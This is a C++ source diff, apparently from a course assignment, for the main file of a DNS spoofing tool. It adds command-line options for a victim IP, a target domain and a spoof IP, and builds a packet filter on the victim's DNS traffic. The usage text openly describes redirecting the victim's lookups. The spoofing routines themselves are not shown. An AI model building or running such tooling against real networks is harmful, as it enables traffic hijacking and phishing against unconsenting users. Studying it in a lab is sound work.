@@ -5,6 +5,7 @@
 #include <dnet.h>
 #include "Logger.h"
 #include "NetworkMonitor.h"
+#include "argparcer.h"
 
 using namespace std;
 
@@ -40,7 +41,7 @@ void shutdownServer(int signo){
  */
 bool getInterface(){
 
-    Logger::setDebug(true);
+
     Logger::debug("Main:getInterfaces - Initializing");
 
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -78,8 +79,46 @@ bool getInterface(){
     return false;
 }
 
+void printUsage(){
 
-int main() {
+    Logger::println("----------------------------------------------------------");
+    Logger::println("DNS Spoof - Ben Soer");
+    Logger::println(" - Allows DNS Spoofing of specified traffic by redirecting DNS requests to specified IP locations");
+    Logger::println("\tParameters:");
+    Logger::println("\t\t-v\tThe IP of the victim machine having its DNS requests spoofed");
+    Logger::println("\t\t-d\tThe Domain to be spoofed");
+    Logger::println("\t\t-s\tThe Spoof IP. The Location the Spoofed DNS responses will redirect to");
+    Logger::println("\tUsage:");
+    Logger::println("\t\tsudo ./8505_a4_dnsspoof -v <victimip> -d <domain> -s <spoofip>");
+    Logger::println("\tExample:");
+    Logger::println("\t\tsudo ./8505_a4_dnsspoof -v 192.168.0.100 -d bensoer.com -s 142.232.66.1");
+    Logger::println("\t\t- This will spoof all DNS requests to bensoer.com from the host 192.168.0.100 and resolve them to milliways.bcit.ca");
+    Logger::println("----------------------------------------------------------");
+}
+
+
+
+int main(int argc, char * argv[]) {
+
+    //parse args
+    ArgParcer parcer;
+
+    if(argc <= 1){
+        printUsage();
+        return 1;
+    }
+
+    string victimIP = parcer.GetTagData("-v", argv, argc);
+    string domain = parcer.GetTagData("-d", argv, argc);
+    string spoofIP = parcer.GetTagData("-s", argv, argc);
+
+    Logger::setDebug(parcer.TagExists("--DEBUG", argv, argc));
+
+    if(victimIP.compare("-1")==0 || domain.compare("-1")==0 || spoofIP.compare("-1")==0){
+        Logger::println("Invalid Parameters Passed. See Usage");
+        printUsage();
+        return 1;
+    }
 
     //register listening for kill commands.
     struct sigaction act;
@@ -103,13 +142,15 @@ int main() {
     Logger::debug("Fount Interfaces. Now Setting Up NetworkMonitor");
 
     monitor = NetworkMonitor::getInstance();
-    monitor->setFilter("ip src 192.168.0.100 and dst port 53");
+    monitor->setFilter("ip src " + victimIP + " and dst port 53");
+    monitor->setSpoofIP(spoofIP);
+    monitor->setDomain(domain);
 
     Logger::debug("Filter Set. Now Listening");
 
     while(keepListening){
 
-        //this will return a structure containing the received information
+        //initiate listening for information on handling DNS requests
         monitor->listenForTraffic(listeningInterface);
 
         if(keepListening == false){
